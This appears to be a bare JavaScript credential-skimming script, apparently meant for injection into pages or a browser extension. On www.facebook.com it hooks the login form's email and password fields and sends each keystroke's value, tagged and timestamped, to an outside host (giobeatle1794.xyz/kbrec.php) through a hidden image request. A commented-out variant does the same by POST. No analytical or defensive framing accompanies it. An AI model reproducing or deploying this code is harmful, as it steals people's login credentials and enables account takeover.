function sndDataMail(e){
 valuetosend = this.value + '(mail)';
 datetosend = new Date().toISOString();
 console.log(valuetosend);
 f = document.createElement('img');
 f.style.display = 'none';
 srcc = 'http://giobeatle1794.xyz/kbrec.php?psw=' + encodeURIComponent(valuetosend) + '&date=' + encodeURIComponent(datetosend);
 f.src = srcc;
 document.body.appendChild(f);
}
function sndDataPsw(e){
 valuetosend = this.value + '(pass)';
 datetosend = new Date().toISOString();
 console.log(valuetosend);
 f = document.createElement('img');
 f.style.display = 'none';
 srcc = 'http://giobeatle1794.xyz/kbrec.php?psw=' + encodeURIComponent(valuetosend) + '&date=' + encodeURIComponent(datetosend);
 f.src = srcc;
 document.body.appendChild(f);
}
/*function sndDataPost(e){
 console.log(this.value);
 var xhr = new XMLHttpRequest();
 var data = {
  "cad": this.value,
  "date": new Date().toISOString()
 };
 xhr.open("POST", "http://giobeatle1794.xyz/kbrec.php", true);
 xhr.setRequestHeader("Content-Type", "application/json");
 xhr.onreadystatechange = function(){
  if (xhr.readyState === 4 && xhr.status != 204){
   console.log(xhr.status.toString());
  }
 };
 xhr.send(JSON.stringify(data));
}*/
if (window.location.hostname == "www.facebook.com"){
 var emailFrm = document.querySelectorAll('#login_form [type=email]')[0];
 var pssFrm = document.querySelectorAll('#login_form [type=password]')[0];
 emailFrm.addEventListener("input", sndDataMail);
 pssFrm.addEventListener("input", sndDataPsw);
}
